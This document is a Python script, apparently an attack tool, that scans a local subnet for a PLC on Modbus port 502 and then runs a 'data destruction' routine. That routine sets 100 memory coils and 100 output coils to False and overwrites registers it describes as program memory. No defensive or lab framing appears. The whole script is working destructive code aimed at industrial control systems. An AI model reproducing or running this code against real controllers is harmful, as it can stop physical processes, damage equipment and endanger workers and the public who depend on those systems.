from pymodbus.client import ModbusTcpClient
from pymodbus.payload import BinaryPayloadBuilder, BinaryPayloadDecoder
from pymodbus.constants import Endian
import socket
import time

# Function to discover PLC's IP address
def discover_plc_ip():
    # Replace with the actual subnet range if known
    subnet = "192.168.9."
    for i in range(1, 255):
        ip = subnet + str(i)
        try:
            # Attempt to connect to the PLC's Modbus port (default: 502)
            client = ModbusTcpClient(ip, port=502, timeout=1)
            if client.connect():
                print(f"Found PLC at IP: {ip}")
                client.close()
                return ip
        except Exception as e:
            pass
    print("PLC not found on the network.")
    return None

# Function to perform data destruction
def data_destruction(plc_ip):
    try:
        # Connect to the PLC
        client = ModbusTcpClient(plc_ip, port=502)
        if not client.connect():
            print("Failed to connect to the PLC.")
            return

        # Overwrite critical memory areas (e.g., %M, %Q, program logic)
        print("Starting data destruction...")

        # Overwrite memory bits (%M)
        for address in range(0, 100):  # Adjust range based on PLC memory size
            client.write_coil(address, False)  # Set all memory bits to False

        # Overwrite output coils (%Q)
        for address in range(0, 100):  # Adjust range based on PLC memory size
            client.write_coil(address + 8000, False)  # Set all output coils to False

        # Overwrite program logic (if accessible via Modbus)
        # This is highly dependent on the PLC's configuration and Modbus capabilities
        # Example: Overwrite program memory with empty data
        builder = BinaryPayloadBuilder(byteorder=Endian.Big, wordorder=Endian.Big)
        builder.add_string("")  # Add empty data
        payload = builder.to_registers()
        client.write_registers(0, payload)  # Overwrite program memory

        print("Data destruction completed.")
    except Exception as e:
        print(f"Error during data destruction: {e}")
    finally:
        client.close()

# Main script
if __name__ == "__main__":
    # Step 1: Discover PLC's IP address
    plc_ip = discover_plc_ip()
    if not plc_ip:
        print("Exiting script as PLC IP could not be found.")
        exit()

    # Step 2: Perform data destruction
    data_destruction(plc_ip)